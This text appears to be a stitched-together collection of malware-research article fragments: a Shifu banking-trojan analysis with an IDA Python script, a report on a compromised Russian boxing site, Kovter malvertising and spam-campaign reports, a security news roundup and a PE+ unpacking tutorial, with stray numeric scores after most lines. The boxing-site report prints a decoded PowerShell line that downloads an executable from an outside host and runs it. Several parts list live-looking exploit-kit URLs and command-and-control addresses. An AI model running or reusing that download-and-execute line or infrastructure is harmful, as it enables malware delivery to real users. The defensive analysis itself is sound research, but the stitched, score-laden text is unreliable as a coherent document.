When information is collected on the machine, it is immediately sent back to the C&C server via the path ‘/news/userpanel.php’. A fake HTTP referrer, ‘www1.google.com’, is used throughout the C&C communications.
When there is a need to generate a random domain name via a domain generation algorithm (DGA), the malware contacts the master C&C server first to retrieve some configuration data via the path ‘/news/users.php’.
In the payload of the most recently distributed Shifu, with a compilation date of 06 Oct 2015, we have noticed a subtle update: it no longer connects to the C&C server on machines that are found to have Man-in-the-Middle (MitM) interception for HTTPS connections. It makes this check by comparing the certificate’s MD5 fingerprint with those of some well-known websites (see Figure 7):
microsoft.com
dropbox.com
twitter.com
sendspace.com
etrade.com
facebook.com
instagram.com
github.com
icloud.com
python.org
Figure 7. Checking the existence of MitM interception on HTTPS.
The purpose for this update is believed to be to avoid the malware’s SSL traffic being intercepted and analysed by researchers and by intrusion detection systems that typically have SSL traffic inspection capabilities.",0.013764642451266518
"One browser plug-in kills them all
It seems that Shifu’s author feels nostalgic about the PhishWall anti-phishing solution from SecureBrain. All third-party browser plug-ins will be disabled immediately via a single registry value, ‘Enable Browser Extensions’, located in HKCU\Software\Microsoft\Internet Explorer\Main, if PhishWall is found to be installed as an Internet Explorer plug-in. This makes sense, given that Shifu was first found to be actively spread in Japan, as SecureBrain is a Japanese security provider. Moreover, it appears that Shifu’s author is cautious with the SecureBrain solution and does not want to create obvious noise – for example by disabling all browser plug-ins – that could easily alert non-tech-savvy victims.
In addition to disabling third-party IE plug-ins, it also disables the pop-up blocker in IE through a registry key:
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3
""1406"" = 0",0.010662977345800906
"Botnet-like banking trojan
Last but not least, Shifu also allows the botnet operator to download and execute additional modules, hence it supports a limited set of commands. The following is a list of commands currently supported by the malware:",0.013653746575161052
"webinject
Webinjection to the targeted Internet banking sites is carried out through a local Apache server installed silently by Shifu. In the underlying code, we realized that the botnet operators issue mitm_mod and mitm_script commands to download a copy of the Apache web server software as well as the webinjection script and its associated configuration file, config.xml. When these files are in place on the infected machine, the malware will first modify and make sure the Apache server is properly configured by setting the server’s address to localhost (127.0.0.1) using a random port for both HTTP and HTTPS. After the server’s configuration file is set, the server’s process will be started and its status will be monitored periodically through an asynchronous thread every second to make sure it keeps running.
Webinjection through the local HTTP server won’t work without setting up a hook on the browser process. However, the hook implementation is simpler than that of traditional banking trojans. Table 4 shows a summary of the hooks on the Winsock API. Besides hooking the Winsock API, it also hijacks the SSL verification API used by the browser process so that the verification is always successful regardless of whether the presented SSL certificates are valid.
Hook Windows API
Purpose
ws2_32!connect ws2_32!connectEx
Redirect all the HTTP/HTTPS traffic to a local HTTP server to carry out man-in-the-middle operation
crypt32!CertVerifyCertificateChainPolicy nss3.dll!SSL_AuthCertificateHook nspr4.dll!SSL_AuthCertificateHook
Always return success when the browser’s SSL verification process takes place
Table 4. Hooks on the Winsock API.",0.016734917136531302
"wipe_cookies
It is assumed that Shifu is mainly distributed via Flash-based exploit kits. This module allows the botherder to make the botnet clean up Flash cookies found in the %APPDATA%\Macromedia folder to cover the presence of the exploited Flash files.",0.0074221925104964726
"update
Like most software, the botnet also supports automatic updates. As the malware uses a trivial protection method to prevent the removal of the malware file – through an opened file handle – it must first close the file handle before being able to replace the new binary file.",0.012429572613550932
"load
This allows for the execution of arbitrary executables downloaded from the C&C server.",0.006814510129769635
"kill_os
The real reason why the botnet supports the self-destruction feature (which destroys both the malware and the operating system) is still a mystery to us. But based on the nature of the botnet – it copies lots of ideas and codes from different notorious malware – and the fact that it tries to evade analysis by both auto-analysis systems and manual analysis, we can safely assume that the self-destruction routine will be executed when it is found to be executing on an unwilling platform.
The self-destruction routine (see Figure 8) is pretty straightforward:
Remove all the files attached to removable drives, for instance thumb drives.
Corrupt the filesystem (e.g. NTFS/FAT) by overwriting its boot sector.
Shut down the machine.
In case the shutdown operation is not successful, it terminates itself.
Figure 8. Shifu’s self-destruction routine.",0.013420390897763257
"Conclusion
In conclusion, Shifu is an enhanced or improved piece of banking malware that has borrowed a lot of techniques from its predecessors; it rectified and refined the weaknesses possibly found in other renowned competitors. The author clearly has a good understanding of how to deal with thread synchronization in multi-threaded applications – which could indicate that he/she is an experienced programmer. However, the use of some old-school techniques in Shifu can be easily spotted and blocked by many security products.",0.012782534503099185
"Bibliography
[1] Japanese Banking Trojan Shifu Combines Malware Tools. https://blogs.mcafee.com/mcafee-labs/japanese-banking-trojan-shifu-combines-malware-tools/.
[2] Shifu: ‘Masterful’ New Banking Trojan Is Attacking 14 Japanese Banks. https://securityintelligence.com/shifu-masterful-new-banking-trojan-is-attacking-14-japanese-banks/.",0.01379326242210277
"Appendix
Table A1 shows the sample SHA1 used in the analysis.
Compilation timestamp
Dropper’s SHA1
X86 Payload’s SHA1
18 August 2015
963BFC778F94FE190FDD1DD66284E9BC9DD2BED6
16E4476146511F6B9D8DDF4B232D896D7EC91F50
06 October 2015
B4ED692D6E8C35F3C611084E6785972CCAE8DCDC
8FC58220FD84F3A59F20D52F4A07F07657474467
Table 5. Sample SHA1 used in the analysis.
shifu_fix_iat.py",0.010314501751348404
"import idaapi
import idautils",0.01019175105852077
"# Global variables
IMG_BASE = idaapi.get_imagebase()
list_seg = []
for seg in idautils.Segments():
list_seg.append(seg)
IMG_END = idc.SegEnd(list_seg[len(list_seg)-1])",0.02073134855641412
"def decrypt(ea, key):",0.011552321142214494
"# Virtual address to IMAGE_IMPORT_DESCRIPTOR->FirstThunk
va_iat = 0
# Virtual address to IMAGE_IMPORT_DESCRIPTOR->OriginalFirstThunk
va_int = 0
tmp_ea = ea",0.013818112877583277
"# Back-tracing to locate the IMAGE_IMPORT_DESCRIPTOR from import address table passed from the callback
for xref in idautils.XrefsTo(ea, 0):
if XrefTypeName(xref.type) == ‘Data_Offset’:
va_iat = xref.frm - 0x10",0.01318024116807115
"if va_iat != 0:
print “Import Name Table->%08x” % (idaapi.get_long(va_iat) + IMG_BASE)
va_int = idaapi.get_long(va_iat) + IMG_BASE
else:
return",0.01645685492974225
"if va_int != 0:
va_itd = idaapi.get_long(va_int)
# Enumerate array of IMAGE_THUNK_DATA
while va_itd != 0:
va_itd = va_itd + IMG_BASE
if va_itd > IMG_BASE and va_itd <= IMG_END:
print «Image thunk data->%08x» % va_itd
va_ibn = va_itd + 2
ch = idaapi.get_byte(va_ibn)
str = ‘’
while ch != 0 and ch != 255:
str += chr(ch ^ key)
va_ibn += 1
ch = idaapi.get_byte(va_ibn)",0.02650918155281512
"# Save the decoded import name
print «IMAGE_IMPORT_BY_NAME->Name (%08x): %s» % (va_itd+2, str)
idc.MakeName(tmp_ea, str)
tmp_ea += 4",0.015569283581640447
"# Next IMAGE_THUNK_DATA
va_int += 4
va_itd = idaapi.get_long(va_int)
else:
return",0.01842055541350862
"def imp_cb(ea, name, ord):
if not name:
print «%08x: ord#%d» % (ea, ord)
else:
print «%08x: %s (ord#%d)» % (ea, name, ord)",0.025822079333016945
"# The decrypt function will be responsible to enumerate IMPORT_DESCRIPTOR_TABLE to decode all the function name
decrypt(ea, 0xFF)
# We only want to callback once for every imported DLL
return False",0.016591146000754065
"# Main
nimps = idaapi.get_import_module_qty()",0.009756696665882414
"for i in xrange(0, nimps):
name = idaapi.get_import_module_name(i)
if not name:
print «Failed to get import module name for #%d» % i
continue",0.01348680075859332
"print «Walking-> %s» % name
idaapi.enum_import_names(i, imp_cb)",0.013683209698082566
"print «All done...»
",0.014320994269553022
Highly Evasive Code Injection Awaits User Interaction Before Delivering Malware,0.011920191091508325
"On September 27, 2016 Forcepoint Security Labs noticed that the Russian boxing site allboxing[.]ru was compromised. The site is injected with code that attempts to silently redirect users to a third party website containing an exploit and a Russian banking trojan. The injected code employs several evasion tactics, and ensures that the redirect only occurs when there is significant user interaction on the website.",0.00869296364943939
Hiding in Plain Sight,0.01047586277290602
The site allboxing[.]ru is a very popular Russian boxing website receiving an estimated 3 million visitors per month.,0.015467925425244555
"One of the scripts being used by the website at hxxp://allboxing[.]ru/misc/jquery.once.js?v=1.2 has been modified to include additional code. The code claims to be loading a jQuery plugin called ""jQuery Animate Plugin v1.2"" but this is in fact a fake plugin inserted by the attacker.",0.009036803447489805
"Once of the giveaways here is that the URL reference for the plugin links to ""http://plugins.jquery.com/tag/animate"", whereas legitimate plugins will usually reference the project name directly such as ""http://plugins.jquery.com/project/once"". Nevertheless, the attacker has made significant effort to blend in with the legitimate content by using the same formatting and comment style.",0.015141087139913356
"The modified jquery.once.js script loads a second script from /misc/jquery.animate.js which in turn attempts to insert a script from the attacker's own website. The script is not inserted if the user's browser is either Chrome or Opera, presumably because the attacker is not able to exploit these browsers.",0.007660466424157519
The automate.js script on getcanvas[.]org then waits for user interaction before inserting an iFrame to an exploit.,0.009992541169625113
"The script ensures that sufficient user interaction has occurred from either clicking, scrolling or moving the mouse. The attacker has given different weighting scores to the different types of user interaction and will only insert the iFrame once the threshold score is above 30. This is a stealth tactic used to prevent automated analysis systems from being redirected to the exploit. The technique was first documented back in 2014 in a similar infection chain.",0.008537384774209955
"Another stealth tactic employed here is the domain name and URL path which has been used. The term ""canvas"" is a well known boxing term and the URL contains the word ""sport"". This makes the URL appear a lot less suspicious considering that allboxing[.]ru is a boxing news site.",0.01312400681281145
Exploiting Internet Explorer,0.007494651330352875
The malicious iFrame inserted by the attacker was located at hxxp://getcanvas[.]org/sport/page/5.html. The page contains a VBScript exploit that leverages CVE-2016-0189 and attempts to run a Powershell script on the machine.,0.006696340351911689
The Powershell script decodes to the following:,0.008575569111272996
"(New-Object System.Net.WebClient).DownloadFile(""http://getcanvas.org/sport/boxing/tysonfury.jpg"",""islzma32.exe"");(New-Object -com Shell.Application).ShellExecute(""islzma32.exe"");",0.010971305104514717
The script downloads and executes tysonfury.jpg which is a variant of the Buhtrap Russian banking trojan. The SHA1 of the sample we received is b74f71560e48488d2153ae2fb51207a0ac206e2b.,0.010627724881856038
Protection Statement,0.009481584346963334
Forcepoint™ customers are protected against this threat via TRITON® ACE at the following stages of attack:,0.008136822717896841
Stage 2 (Lure) - The fake jQuery plugin is identified and blocked.,0.013208882854663706
Stage 3 (Redirect) - The attempt to insert a malicious iFrame onto the page is blocked.,0.01145490018649964
Stage 4 (Exploit) - The CVE-2016-0189 exploit is identified and blocked.,0.011630867966905267
Stage 5 (Dropper) - The Buhtrap malware is prevented from being downloaded.,0.014436365117606487
Stage 6 (Call Home) - Attempts by the Buhtrap variant to call home are identified and blocked.,0.010877112727389004
Summary,0.009602684635656611
"Attackers are getting better at disguising the code they inject into compromised websites. Websites with high volumes of traffic are a popular choice for attackers, and this is especially true if the bulk of the traffic is from a specific region of the world of interest to the attacker. With the recent arrests of actors using the Lurk banking trojan, Buhtrap appears to be a likely alternative for actors wishing to target Russian banks and software.",0.016155546783783503
Indicators of Compromise,0.0076996116119932845
Compromised Website,0.009962110070377728
hxxp://allboxing.ru,0.00859761622771904
Exploit Sites,0.00744206769078537
"http://getcanvas.org
http://medioca-room02.org",0.010858261150516468
Buhtrap Sample (SHA1),0.016642644682837382
"b74f71560e48488d2153ae2fb51207a0ac206e2b
aa0fa4584768ce9e16d67d8c529233e99ff1bbf0
193dd67915d544409e8c5722c22175b0f417999c",0.012525579899229866
Buhtrap Command-and-Control Server,0.0106855109387326
"http://91.215.153.31/r/z.php
",0.008761498001703338
"Major malvertising campaign spreads Kovter Ad Fraud malware
Last year was a busy year for malvertising with top rank ad networks such as Google’s DoubleClick caught in large scale attacks, and popular sites unwillingly infecting their visitors because of malicious advertisements.
And 2015 is getting off to a rough start as well.
As Nick Bilogorskiy from Cyphort reported earlier this week, a campaign has been wreaking havoc on sites generating much Internet traffic.
These attacks are the work of the Kovter gang which has been busy hitting major other players (ie. YouTube) during the past year. We tracked this particular campaign as well and have observed several high level domains being victim of malvertising with a combined monthly traffic of 1.5 billion visitors.
People surfing with outdated plugins or browser get infected through a ‘drive-by download’ attack that turns their PCs into bots participating in Ad Fraud.
Affected sites",0.013658610764695767
"Domain name
Alexa rank*
Monthly traffic**",0.01280253862775449
"news.yahoo.com
65
527",0.011131579430540883
"huffingtonpost.com
88
248",0.012947385603520933
"aol.com
156
218",0.011371128583137713
"weather.com
159
138",0.010451546699550285
"sports.yahoo.com
187
188",0.016489940918420598
"tmz.com
454
43",0.011373100662857127
"nydailynews.com
609
46",0.011672490003429181
"tagged.com
611
58",0.01033294688687092
"chron.com
736
31",0.00812902061136167
"match.com
826
35",0.007972730165602626
"legacy.com
1537
22",0.008153636079553883
"startribune.com
3648
5",0.00762405403826405
"123greetings.com
3854
12",0.009880598875688706
"gaiaonline.com
4462
2",0.008711067662796945
"beforeitsnews.com
4553
7",0.010782709367919363
"intellicast.com
4681
13",0.007981458881503367
"mom.me
6515
4",0.0067262131500808175
"centurylink.net
6580
8",0.008528202717699718
"rent.com
12582
2",0.009593169324597084
"entertainment.verizon.com
12667
3",0.009574707858992726
"windstream.net
12802
3",0.0075237794020019955
"twincities.com
17457
2",0.007683223896121971
"webmail.comcast.net
N/A
N/A",0.012489059547788894
"webmaila.juno.com
N/A
3",0.009774844585458409
"* Alexa rank based on Alexa.com data. Subdomains’ rank checked against SimilarWeb.com
** Estimated monthly traffic in millions according to data from SimilarWeb.com
Ad networks",0.013904666644825037
"advertising.com
adtech.de
googlesyndication.com",0.010860473622106404
"Intermediate site
foxbusness.com
""domain""=>""foxbusness.com"", ""resolv""=>[""176.9.251.252""], ""port""=>""443"", ""uri""=>""/?serve&id=1347&log=235"", ""md5""=>"""", ""header""=>""
---- Referer: http://tpc.googlesyndication.com/safeframe/1-0-1/html/container.html\r\nAccept-Language: en-us\r\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)\r\nAccept-Encoding: gzip, deflate
Referrers
Examples of direct referrers (IP address: 162.247.13.70 – Canada)
uhupa.econsumerproductexposed.swidnica.pl/1141843503/c5893070b1e9a472d191ceb6b65e2d472bfc0e4c
choim.vjutakujoho.mazowsze.pl/1144037683/46cab3acbf9a045526dca7c288a3b051064fd23b
keywo.mbaang.olsztyn.pl/1809008432/8eb85bf31fa1e087bd8165bbe8876e32a137fd07
etern.xbkblogueurpro.nysa.pl/849637756/8d75a79e1ee7a789ba8c26ef163fab9a2b81d81d
omais.uacademics.miasta.pl/1111073264/0b457ead38ceaed7d086cea48e2b21a7d264f863",0.012497082825279282
"Exploit Kit (Sweet Orange)
Examples of Exploit Kit landing pages (IP address:195.138.246.17 – Germany)
forex.dsantanderbillpayment.pruszkow.pl/download/page.php?vendor=228376&products=105122&smiles=18&back=150083&linktous=3314
vivaw.hloupfute.sanok.pl/link/counter/page.php?time=254228&cityprice=160825&aboutus=88234&smiles=18&community=158990
georg.tgrupoeroski.ostrowwlkp.pl/server_admin_small/template/dcontent/page.php?flash=296895&personal=312161&english=311124&downloads=241026&smiles=18&contests=234771
jazzp.yv102.limanowa.pl/notebook/gp/page.php?events=156334&browse=278551&documents=60024&smiles=18&contests=9009
blaze.vnoeuf.podlasie.pl/cadmins/page.php?classes=163726&virus=195712&customer=197770&top_left=95496&smiles=18&proxy=198597
Sweet Orange landing page source code
The vulnerability exploited was CVE-2014-6332 and Internet Explorer was the target.
Malwarebytes Anti-Exploit blocks this attack:",0.009595551012465453
"Payload
The payload, Kovter, gets dropped in the Temp folder:
“C:\Users\{username}\AppData\Local\Temp\repfix.exe”
The payload is VM aware and also looks for debugging and other security tools. One way to know if the sample properly ran is whether it deletes itself after execution or not.
VM or security tools on a real PC:",0.013949019578210375
"Sample does not delete itself
POST request (domain may change) in this format: (a16-kite.pw/form2.php):",0.01225666932420677
"Real machine, no security tools:",0.007585773873624357
"Sample deletes itself
POST request (domain may change) in this format: a16.car.biz/11/form.php",0.012554210489478135
We analyzed this in a real environment using Wireshark on an external laptop to make this completely transparent to the malware. That allowed us to see what it really is: Ad Fraud (and not ransomware as reported earlier by other sites),0.013407433649476719
"Shortly after, the flood of ad fraud requests begins:",0.010123587786681543
"Ad fraud, or also click fraud, account for a large part of the billion dollar ad industry. Ad fraud malware essentially simulates the user visiting pages with adverts as if they were legitimate views.
All these requests are made in the background and game the system while the victim is none the wiser.
Malwarebytes Anti-Malware already detects and blocks this threat:",0.020871435937341087
"Malvertising to remain one of the top threats in 2015
As we had said it in our end of year report, malvertising is a huge issue that affects a wide range of people. End users, of course, but also advertisers and publishers who have to fight to defend their legitimacy.
Cyber criminals will likely continue to hijack ad networks with malicious code and pocket the dividends from hundreds of thousands of successful infections.
This particular campaign is likely to migrate to other controllers or evolve into something else since it is now in the public domain and affected parties are cleaning up and securing their systems.
Malwarebytes Labs will continue to monitor the situation and update you on any new developments.
Special thanks to JP Taggart for providing the external recording system.
",0.01624526221632261
"Remember the LinkedIn exploits and malware serving campaigns which I profiled in March, and May?
Over the past 24 hours, cybercriminals launched the most recent spam campaign impersonating LinkedIn, in an attempt to trick LinkedIn’s users into clicking on the client-side exploits and malware serving links found in the emails.
More details:",0.016000029886403033
Screenshot of the spamvertised email:,0.01024206182675269
"Spamvertised URL: hxxp://glqzc.com/linkzane.html
Client-side exploits serving URL: hxxp://headtoheadblaster.org/main.php?page=f6857febef53e332
Client-side exploits served: CVE-2010-1885
Upon successful client-side exploitation, the campaign drops MD5: 6c59e90d9c3931c900cfd2672f64aec3 currently detected by 4 out of 41 antivirus scanners as PWS-Zbot.gen.ajm; W32/Kryptik.BRK.
Webroot SecureAnywhere users are proactively protected from this threat.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.008154727774837833
"A Week in Security (Jan 18 – 24)
Last week, the security industry honed in on exploits, specifically a newly found zero-day malware against Adobe Flash Player. Senior Security Researcher Jérôme Segura discussed this clearly and concisely in this blog post. The vulnerability the exploit was designed to take advantage of was designated CVE-2015-0311, and it was recently patched. If you want to learn more about exploits and how big a threat they are to user systems, a great recommended reading would be “Exploit Kits: A Fast Growing Threat“, also penned by Segura.
Fellow senior in the security research field, Nathan Collier, spotted and documented a rogue wallpaper app on Google Play that, once installed on mobile devices, can steal account details from users.
Security Researcher Christopher Boyd reminded us once more to be vigilant when in social networks as threats remain: one from Tumblr, which posed as a Tumblr app users can download. The file was found to transform affected accounts to bots; and lastly from Facebook, which is a re-appearance of Facebook Color, this time in red.
Notable news stories and security related happenings:",0.011653414230692993
"Microsoft Outlook Hacked Following Gmail Block in China. “On Monday, online censorship watchdog Greatfire.org said the organization received reports that Outlook was subject to a man-in-the-middle (MITM) attack in China.” (Source: ZDNet)
Which Is The Most Secure Web Browser?. “It turns out that ranking web browser security isn’t all that cut and dried. There are a lot of factors that go into safe browsing online, and when you take them all into account, perhaps no one browser can truly be called the safest.” (Source: Information Security Buzz)
‘123456’ & ‘Password’ Are The 2 Most Common Passwords, Again. “New entrants to the top 25 show that bad password creators are fans of sports, superheroes, dragons, and NSFW numeral combos.” (Source: Dark Reading)
Gamers Hit with Trojanized Versions of Official League of Legends Releases. “Computer security experts often advise to users to download games, apps, documents, software and software updates directly from the original source (the manufacturer) or from reputable online stores. It’s good advice that minimizes considerably the danger of downloading malware, but it’s also not a guarantee that it won’t happen…” (Source: Help Net Security)
PageLines and Platform Themes for WordPress Affected by Serious Security Flaws. “Security researchers also discovered that in the case of Platform there is another security bug, which permits an attacker to execute arbitrary code remotely, which could also lead to gaining full privilege on the website.” (Source: Softpedia)
Adobe Fixes Just One of Two Actively Exploited Zero-day Vulnerabilities in Flash Player. “On Wednesday, a French malware researcher who uses the online alias Kafeine reported on his blog that cybercriminals using the Angler Exploit Kit are targeting an unpatched vulnerability in Flash Player. That vulnerability, it seems, is not CVE-2015-0310 and remains unpatched.” (Source: CSO Online)
Click-fraud Malware Brings Thousands of Dollars to YouTube Scammers. “The malware that makes it possible is dubbed Tubrosa. It consists of two components: one that is delivered via spear-phishing spam emails and is installed by careless users, and the other that is downloaded and run by the first component.” (Source: Help Net Security)",0.012354787661921107
"Safe surfing, everyone!
The Malwarebytes Labs Team
",0.01166910416539002
"Over the past 24 hours, cybercriminals have spamvertised millions of emails impersonating Intuit Market, in an attempt to trick end and corporate users into clicking on the malicious links found in the emails.
Upon clicking on them, users are exposed to the client-side exploits served by the Black Hole web malware exploitation kit.
More details:",0.016168018851225874
Sample screenshot of the spamvertised email:,0.010990132234593664
"Spamvertised malicious iFrame domains: hxxp://kolmykiaonline.ru:8080/forum/showthread.php?page=5fa58bce769e5c2c; hxxp://anapoli.ru:8080/forum/showthread.php?page=5fa58bce769e5c2c
Client-side exploits served: CVE-2010-1885; CVE-2010-0188
Upon successful client-side exploitation the campaign drops MD5: aea6d9be93a6f64357b96db96e9c7e10 – detected by 20 out of 42 antivirus scanners as Trojan-Dropper.Win32.Dapato.bpqu; Worm:Win32/Cridex.E, and MD5: 7fe4d2e52b6f3f22b2f168e8384a757e – detected by 28 out of 42 antivirus scanners as Trojan.Win32.Buzus.lxwt; Worm:Win32/Cridex.E
Name servers part of the campaign’s infrastructure:
kolmykiaonline.ru – 50.56.92.47; 203.80.16.81
ns1.kolmykiaonline.ru – 85.143.166.186
ns2.kolmykiaonline.ru – 132.248.49.112
ns3.kolmykiaonline.ru – 87.120.41.155
anapoli.ru – 50.56.92.47; 190.120.228.92; 203.80.16.81
ns1.anapoli.ru – 85.143.166.186
ns2.anapoli.ru – 203.172.140.202
ns3.anapoli.ru – 87.120.41.155
ns4.anapoli.ru – 173.224.208.60
ns5.anapoli.ru – 132.248.49.112
We’ve already seen the same IPs and command and control servers used in the recently profiled “Spamvertised ‘Fwd: Scan from a Hewlett-Packard ScanJet’ emails lead to Black Hole exploit kit” campaign. Based on this fact, we can conclude that these campaigns are operated by the same cybercriminal/gang of cybercriminals.
The last time we profiled an Intuit themed malicious campaign, was in July 2012.
Webroot SecureAnywhere users are proactively protected from these threats.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.011146016373427603
"Unpacking x64 PE+ binaries: introduction part 1
2012-07-01",0.0105801037106531
"Aleksander P. Czarnowski
AVET INS
,
Poland
Editor:
Helen",0.010204728485268988
"Martin
Abstract
Aleksander Czarnowski describes some of the main differences between the PE and PE+ file formats from the perspective of the binary unpacking process.
Copyright © 2012 Virus Bulletin",0.016558153581508583
"The x86-64 architecture is taking over from IA32 CPUs – but this should not come as a surprise, especially since major operating system players have been supporting it for years already. Of course, malware authors are aware of this revolution and thus they target executable files running natively on AMD64-compatible architectures and operating platforms. One of the most complex (and flexible) executable formats in the 64-bit world is Microsoft Windows PE32+ (since the name is a bit misleading, we will refer to it as ‘PE+’ in the rest of this article). Due to the closed-source nature of Windows, the best and most advanced debuggers and anti-debugging techniques have been developed for the Win32/64 world. Linux and BSD systems lag behind, while embedded systems for the mobile market such as Android and iOS are catching up in this area.
While not all packers/obfuscators have been upgraded to handle 64-bit executable formats, there are a lot of tools that can handle both Windows PE+ files and ELF 64-bit files. In this tutorial I will describe some of the main differences between the PE and PE+ file formats from the perspective of the binary unpacking process.",0.01939219145962756
"PE+ differences
The PE+ file format is a bit like the good old 32-bit Windows PE format on steroids. If you thought you would only be able to execute a PE(+) file after successfully booting into Windows (you don’t have to log in successfully since Windows service files are also PE(+) executables internally), you would be wrong. The PE(+) file format is supported by the UEFI specification, so it is possible to execute UEFI PE files even before the target operating system or hypervisor starts. There is one important note: UEFI expects the PE+ file format even on 32-bit architecture, and furthermore it uses just a subset of PE+ features. In turn, the PE+ file format contains a special flag to mark it as UEFI executable.
Other cases for loading Win32 PE or plain PE files are limited today mostly to some DOS-based embedded solutions. But wait a minute – isn’t DOS a 16-bit real-mode operating system, whose process loader is limited to handling 64KB COM files and MZ EXEs? How can it execute Windows 32-bit protected mode binaries? The answer is simple: DOS extenders.
There are a couple of DOS extenders that offer Win32 PE support out of the box. If you thought that DOS and DOS extenders were part of the past, you would be wrong. Some DOS extenders are still actively being developed and supported: HX DOS Extender [1] is a great example. HX provides a Win32 emulation layer to DOS and enables DOS to load 32-bit PE files.
Returning to our 64-bit version of PE: if you know the PE file format well, you won’t be surprised by changes introduced in PE+. The table below summarizes most of the basic ones:
Field
PE
PE
+
BaseOfData
ULONG (4 bytes)
Removed from the Optional Header
ImageBase
ULONG (4 bytes)
ULONGLONG (8 bytes)
SizeOfHeapCommit
ULONG (4 bytes)
ULONGLONG (8 bytes)
SizeOfHeapReserve
ULONG (4 bytes)
ULONGLONG (8 bytes)
SizeOfStackReserve
ULONG (4 bytes)
ULONGLONG (8 bytes)
StackOfSizeCommit
ULONG (4 bytes)
ULONGLONG (8 bytes)
Table 1. Comparison between PE and PE+ formats.
The AddressOfEntryPoint field has the same size (ULONG) in both PE and PE+ files. How one can recognize a PE+ file? The magic number field in Optional Headers is different:
Field
PE
PE
+
Magic Number
0x10b
0x20b
PE+ executable images are restricted to a maximum size of two gigabytes, so relative addressing with a 32-bit displacement can be used to address static image data. This data includes the import address table, string constants, static global data, and so on.
The rest of the PE+ file looks like a PE file – and what’s more important is that all compression/obfuscation tools that handle PE+ files work in exactly the same way as in the case of 32-bit executable images. Therefore, the unpacking process is also similar. The following sections describe some of the other important differences that the 64-bit architecture brings in.",0.020550318612587604
"Registers
All general purpose registers are extended to 64-bit width in long mode, providing us with RAX, RBX, RCX, RDX, RSI, RDI, RBP, RSP and RIP, which serves like its 32-bit brother EIP as an instruction pointer. New general purpose registers have also been introduced (it seems as if the AMD and Intel engineers finally decided that they envied some of the good old Motorola 68K features): from R8 to R15. New XMM registers are also available: from XMM8 to XMM15. All XMM registers are of 128-bit width. 64-bit MMX0–MMX7 registers are available as well.",0.0183027127946378
"Calling convention
x64 Windows systems no longer use the STDCALL calling convention by default. Instead, the FASTCALL convention is used, which means that the first four parameters are passed in RCX, RDX, R8 and R9 registers. Further parameters are passed using the stack. There are no attempts to spread a single argument across many registers. Additionally, the caller is responsible for allocating parameter space to the callee, and must always allocate sufficient space for the four register parameters, even if the callee doesn’t have that many parameters [2].
Following [3], here is a typical function prolog:
mov   [RSP + 8], RCX
push  R15
push  R14
push  R13
sub   RSP, fixed-allocation-size
lea   R13, 128[RSP]",0.012454892166700926
"And here is a typical function epilog:
add  RSP, fixed-allocation-size
pop  R13
pop  R14
pop  R15
ret",0.011792828891964091
"Unavailable instructions in long mode
It is worth mentioning that while in long mode some of the 16/32-bit instructions are unavailable and can generate an undefined opcode exception (#UD).
Furthermore, opcodes from 40h to 4fh (inc register/dec register) have a different mapping in long mode. The REX prefix uses those while in long mode.
String operation instructions like LODSB, STOSB etc. have been extended to handle 64-bit addressing. In turn, a few new string instructions have been introduced: LODSQ, CMPSQ, MOVSQ, SCASQ and STOSQ. As a consequence, REPx prefixes handle 64-bit registers as well as LOOP, LOOPZ and LOOPNZ. All those string instructions can be found in decompression/decryption loops.
Furthermore, both SYSENTER and SYSEXIT instructions are available from legacy mode. In long mode, the SYSCALL/SYSRET pair is used.
If, during unpacking, you see some of these unavailable instructions in your disassembly, you can be assured that either the unpacking process has gone wrong, or it has not yet finished.
AAA
POPAD
AAD
POP DS
AAM
POP ES
AAS
POP SS
BOUND
PUSH CS
DAA
PUSH DS
DAS
PUSH ES
INTO
PUSH SS
LDS
PUSHA
LES
PUSHAD
POPA",0.01974170910118833
Table 2. Unavailable instructions in long mode.,0.011833610826206375
"WOW64
WOW64 is an emulation layer that enables AMD64 and Itanium-based Windows systems to execute Win32 applications to maintain backwards compatibility. Figure 1 describes the high-level WOW64 architecture. It is worth mentioning that WoW64.dll loads a 32-bit version of ntdll.dll, which loads other 32-bit DLLs that are needed to support Win32 application execution. Most of these DLLs are exact binary copies from the 32-bit system, however some have been modified in order to be able to share resources with 64-bit system components.
Figure 1. WOW64 architecture.
Note that in the case of Itanium-based systems there are two more libraries involved in running 32-bit software:
IA32Exec.bin – contains an x86 software emulator.
Wowia32x.dll – provides an interface between WOW64 and IA32Exec.bin.",0.017486156784059514
"The test files
Since this is a tutorial, I’ve decided not to use a specific malware sample. Instead, I have created a sample PE+ file written in assembly language. This file can be compiled with flat assembler (fasm), which is available at [4]. Do not try to compile this example with different assemblers such as MASM or NASM as you will not succeed without editing the source code. The presented examples use specific fasm syntax. I’ve chosen fasm since it provides a lot of control over output executable files within the source code level and no external linker is needed in our case. For example, you can manually control the layout of PE+ sections, their order and attributes:
; Example of 64-bit PE program
format PE64 GUI
entry start      ;Entry point definition",0.01602370601042591
";DATA SECTION
section ‘.data’ data readable writeable
_caption db ‘Win64 assembly program’,0
_message db ‘Hello World!’,0",0.011928990068210132
";CODE SECTION
section ‘.text’ code readable executable
start:
sub   rsp,8*5     ; reserve stack for API use and make stack dqword aligned
mov   r9d,0
mov r8,_caption
mov rdx,_message
xor rcx,rcx
call  [MessageBoxA]
mov   ecx,eax
call  [ExitProcess]",0.013899191954028
"; IMPORT SECTION
section ‘.idata’ import data readable writeable
dd 0,0,0,RVA krnl_name,RVA krnl_tbl
dd 0,0,0,RVA user_name,RVA user_tbl
dd 0,0,0,0,0
krnl_tbl:
ExitProcess dq RVA _ExitProcess
dq 0
user_tbl:
MessageBoxA dq RVA _MessageBoxA
dq 0
krnl_name db ‘KERNEL32.DLL’,0
user_name db ‘USER32.DLL’,0
_ExitProcess dw 0
db ‘ExitProcess’,0
_MessageBoxA dw 0
db ‘MessageBoxA’,0",0.016640632605432137
"To compile the file just enter: fasm.exe testwin64.asm. Assuming that the compilation succeeded you can now load the binary file into IDA Pro using the standard Open File option. This will be our template file that we will use for all further operations. The file sections and attributes are shown in Figure 2.
Figure 2. Section list of test file before compression.
Next, disassemble the entry point using the Ctrl+E shortcut to jump directly to the start label, as shown in Figure 3. You can see that the data closely resembles our fasm source – now you know why I have chosen fasm for this job: the source code is quite similar to the resulting EXE file.
Figure 3. Entry point and main code of the test file.
